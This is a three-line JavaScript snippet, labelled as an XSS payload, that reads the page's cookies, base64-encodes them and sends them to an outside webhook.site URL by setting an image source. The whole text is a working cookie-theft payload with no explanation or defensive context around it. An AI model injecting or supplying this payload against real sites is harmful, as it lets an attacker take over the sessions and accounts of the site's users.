// XSS Payload to steal cookies
var img = new Image();
img.src = 'https://webhook.site/273cd589-d3e3-45da-bd60-d719989bbffc?data=' + btoa(document.cookie);
